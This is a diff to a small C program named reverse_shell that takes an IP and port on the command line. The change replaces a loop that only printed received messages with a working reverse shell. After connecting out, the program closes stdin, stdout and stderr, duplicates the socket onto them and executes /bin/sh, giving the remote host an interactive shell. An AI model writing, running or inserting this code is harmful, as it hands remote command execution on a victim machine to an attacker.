@@ -13,8 +13,6 @@
 # define BUFFER_SIZE 1024
 # define USAGE "Usage: ./reverse_shell [IP] [PORT]"
 
-static volatile bool should_loop = true;
-
 /**
  * Print a message and quit with exit code 1
  * */
@@ -45,21 +43,13 @@ int connect_to_server(char* server_ip, int server_port) {
     return conn_fd;
 }
 
-
-/**
- * Reads an entire command until the \n
- * */
-void read_command(int conn_fd, char* command) {
-    recv(conn_fd, command, BUFFER_SIZE, 0);
-}
-
 int close_connection(int conn_fd) {
     close(conn_fd);
 }
 
 void sigint_handler(int code) {
     printf("%s\n", "**EXITING**");
-    should_loop = true;
+    exit(0);
 }
 
 int main(int argc, char* argv[]) {
@@ -74,16 +64,14 @@ int main(int argc, char* argv[]) {
     // Quit on ctrl + C
     signal(SIGINT, sigint_handler);
 
-    char command[BUFFER_SIZE] = {0};
-
-    while (should_loop) {    
-        read_command(conn_fd, command);
-        printf("%s", command);
-
-        memset(command, 0, BUFFER_SIZE);
+    close(0); close(1); close(2);
+    if (dup(conn_fd) != 0 || dup(conn_fd) != 1 || dup(conn_fd) != 2) {
+        exit_with_error("Could not manage to override stdin, stdout, stderr");
     }
 
-    close_connection(conn_fd);
+    char* shell_argv[] = {"/bin/sh", NULL};
+    execv("/bin/sh", shell_argv);
 
+    close_connection(conn_fd);
     return 0;
 }
